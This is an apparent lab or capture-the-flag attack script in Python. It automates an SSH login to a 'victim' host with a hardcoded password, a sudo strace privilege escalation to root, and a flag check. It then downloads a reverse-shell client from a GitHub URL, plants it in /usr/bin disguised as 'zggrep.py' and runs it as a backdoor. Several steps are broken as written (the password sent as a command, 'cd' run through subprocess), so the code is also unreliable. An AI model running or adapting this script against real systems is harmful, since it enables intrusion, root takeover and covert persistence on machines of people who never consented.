# start_script.py
import subprocess, config

victim_ip = config.VICTIM_IP
backdoor_path = config.BACKDOOR_PATH
listener_path = config.LISTENER_PATH

def run_command(cmd, timeout=30):
    """Run a command and return (success, output)."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=True,
            timeout=timeout,
        )
        return True, result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return False, e.stderr.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return False, str(e)
    
# download listener
ok, output = run_command(["curl", "-o", "listener.py", f"{listener_path}"])
print(f"listener downloaded on attacker machine" if ok else "Failed", "->", output)

# run listener
ok, output = run_command(["python3", "listener.py"])
print(f"listener run on attacker host" if ok else "Failed", "->", output)

# ssh user@192.168.64.6
ok, output = run_command(["ssh", f"user@{victim_ip}"])
print(f"ssh connection made" if ok else "Failed", "->", output)

# enter password "hill"
ok, output = run_command(["hill"])
print(f"password accepted" if ok else "Failed", "->", output)

# sudo /bin/strace -o /dev/null /bin/bash -p 
# to gain root privileges, install backdoor, and execute payload
ok, output = run_command(["sudo", "/bin/strace", "-o", "/dev/null", "/bin/bash", "-p"])
print(f"root escalation ran" if ok else "Failed", "->", output)

# confirm root escalation succeeded
ok, output = run_command(["cat", "FLAG-root.txt"])
print(f"flag acquired" if ok else "Failed", "->", output)
if ok:
    if output != "week4rootZXJF:":
        print(f"root escalation failed. flag returned={output}")
    else:
        print(f"root escalation successfully verified.")
    
# move to directory where we will install backdoor
ok, output = run_command(["cd", "../../usr/bin"])
print(f"entered /usr/bin" if ok else "Failed", "->", output)

# curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py
ok, output = run_command(["curl", "-o", "zggrep.py", f"{backdoor_path}"])
print(f"backdoor downloaded on w4 host" if ok else "Failed", "->", output)

# run payload on the victim host
ok, output = run_command(["python3", "zggrep.py"])
print(f"backdoor run on listener, payload executed" if ok else "Failed", "->", output)

